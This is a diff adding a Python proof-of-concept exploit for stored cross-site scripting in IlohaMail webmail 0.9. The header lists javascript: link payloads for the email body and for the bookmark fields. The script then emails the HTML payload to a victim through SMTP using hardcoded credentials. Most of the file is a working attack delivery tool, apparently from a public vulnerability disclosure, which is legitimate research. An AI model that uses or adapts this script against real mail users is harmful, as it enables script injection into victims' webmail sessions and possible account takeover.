@@ -1,0 +1,77 @@
+#!/usr/bin/python
+
+'''
+# Exploit Title: IlohaMail Webmail Stored XSS.
+# Date: 18/08/2012
+# Exploit Author: Shai rod (@NightRang3r)
+# Vendor Homepage: http://sourceforge.net/projects/ilohamail/
+# Software Link: http://sourceforge.net/projects/ilohamail/files/IlohaMail-devel/0.9-20050415/
+# Version: 0.9-20050415
+
+#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
+
+
+About the Application:
+======================
+
+IlohaMail is a PHP based lightweight full featured multilingual webmail program with IMAP and POP3 support. 
+IlohaMail also includes a full-featured contacts manager, bookmarks manager, and scheduler.
+
+
+Vulnerability Description
+=========================
+
+1. Stored XSS in e-mail body.
+
+XSS Payload: <a href=javascript:alert("XSS")>POC MAIL</a>
+
+Send an email to the victim with the payload in the email body, Once the user clicks on the url the XSS should be triggered.
+
+
+2. Stored XSS in Bookmarks.
+
+XSS Payload: <a href=javascript:alert("XSS")>
+
+Vulnerable Fields: Name, Category, URL, RSS/RDF, Comments
+
+Add a new bookmark with the XSS payload in the above fields, XSS Should be triggered.
+
+
+'''
+
+import smtplib
+
+print "###############################################"
+print "#          IlohaMail Stored XSS POC           #"
+print "#             Coded by: Shai rod              #"
+print "#               @NightRang3r                  #"
+print "#           http://exploit.co.il              #"
+print "#       For Educational Purposes Only!        #"
+print "###############################################\r\n"
+
+# SETTINGS
+
+sender = "attacker@localhost"
+smtp_login = sender
+smtp_password = "qwe123"
+recipient = "victim@localhost"
+smtp_server  = "192.168.1.10"
+smtp_port = 25
+subject = "IlohaMail Webmail XSS POC"
+
+
+# SEND E-MAIL
+
+print "[*] Sending E-mail to " + recipient + "..."
+msg = ("From: %s\r\nTo: %s\r\nSubject: %s\n"
+       % (sender, ", ".join(recipient), subject) )
+msg += "Content-type: text/html\n\n"
+msg += """<a href=javascript:alert("XSS")>Click Me, Please...</a>\r\n"""
+server = smtplib.SMTP(smtp_server, smtp_port)
+server.ehlo()
+server.starttls()
+server.login(smtp_login, smtp_password)
+server.sendmail(sender, recipient, msg)
+server.quit()
+print "[+] E-mail sent!"
+
